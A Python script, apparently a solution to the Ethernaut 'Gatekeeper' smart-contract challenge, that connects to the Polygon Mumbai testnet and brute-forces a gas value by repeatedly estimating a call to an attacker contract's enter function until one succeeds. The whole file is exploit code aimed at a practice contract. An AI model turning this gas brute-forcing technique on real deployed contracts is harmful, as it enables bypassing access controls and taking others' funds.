
from web3 import Web3
from eth_utils import remove_0x_prefix
import os
import json

class GatekeeperAttack():
    def __init__(self):

        # read sensitive data from file
        curr_path = os.path.dirname(os.path.abspath(__file__)) + '/'
        try:
            with open(curr_path + '../secret.json') as json_file:
                self.secret_json = json.load(json_file)
        except:
            print('secret.json missing')
            exit()

        # init web3
        alchemy_url = "https://polygon-mumbai.g.alchemy.com/v2/" + self.secret_json['alpchemy']['api_key']
        self.w3 = Web3(Web3.HTTPProvider(alchemy_url))
        
        gaetkeeper_attacker_addr = self.secret_json['gaetkeeper_attacker_addr']

        # Define the function signature and arguments
        function_signature = 'enter(address,bytes8,uint32)'

        # Encode the function signature with arguments
        encoded_function_signature = self.w3.keccak(text=function_signature).hex()[:10]
        # arguments
        encoded_arguments = remove_0x_prefix(self.secret_json['gatekeeper_contract_addr']).lower().zfill(64)
        encoded_arguments += self.secret_json['gatekey']


        for gas_offset in range(254, 8191):
            gas = 8191 * 100 + gas_offset
            
            # Combine the encoded function signature and arguments
            data = encoded_function_signature + encoded_arguments + remove_0x_prefix(hex(gas)).lower().zfill(64)

            _txn = {
                'from': self.secret_json['my_addr'],
                'to': gaetkeeper_attacker_addr,
                'gas': 3000000,
                'data': data
            }
            
            try:
                _ = self.w3.eth.estimate_gas(_txn)
                print('FOUND!! gas=', gas)
                return
            except:
                print('failed', gas_offset)
                continue
        

if __name__ == '__main__':
    va = GatekeeperAttack()